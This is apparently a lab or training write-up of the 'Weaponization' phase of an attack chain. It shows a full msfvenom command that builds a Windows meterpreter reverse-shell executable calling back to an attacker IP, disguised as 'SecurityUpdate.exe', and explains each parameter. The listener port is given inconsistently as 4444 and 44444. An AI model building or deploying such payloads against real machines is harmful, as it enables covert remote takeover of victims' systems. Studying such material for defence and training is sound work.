# Phase 2: Weaponization

## 🌟 Objective:
Create a malicious payload that will allow the attacker to gain control of the victim's machine.

### Steps:
#### Choosing the Exploit Delivery Mechanism:
- The attacker decides to use Metasploit’s MSF Venom to create a reverse TCP payload.
- The payload will execute a reverse shell, allowing the attacker to remotely control the victim’s system.

#### Generating the Payload:
- The payload is created using MSF Venom and is compiled into a PP32 executable.
- The payload file is named `SecurityUpdate.exe` to avoid suspicion.

![image](https://github.com/user-attachments/assets/a7b94074-04e0-431c-b011-2252d538c3de)

### 🔹 Payload Generation Command:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.19.19.134 LPORT=4444 -f exe -o SecurityUpdate.exe
```

### 🔹 Explanation of the Command:
| Parameter | Explanation |
|-----------|-------------|
| `msfvenom` | A tool to generate payloads for penetration testing. |
| `-p windows/x64/meterpreter/reverse_tcp` | Creates a **64-bit reverse shell** for Windows. |
| `LHOST=10.19.19.134` | The attacker's IP address. |
| `LPORT=4444` | The attacker's listening port. |
| `-f exe` | Specifies the output format as a Windows **executable** (`.exe`). |
| `-o SecurityUpdate.exe` | Saves the generated payload as `SecurityUpdate.exe`. |

### 🔹 Checking the Payload Type:
Run the `file` command:
```bash
file SecurityUpdate.exe
```
#### Expected Output:
```
SecurityUpdate.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
```
- ✅ **64-bit Windows Executable**
- ✅ **Designed for Graphical UI**
- ✅ **Portable Executable (PE) format**

#### Configuring the Attacker's Machine:
- The attacker's system is set up to listen for incoming connections on port **44444**.
- This will allow the attacker to establish a reverse connection once the victim runs the payload.
  
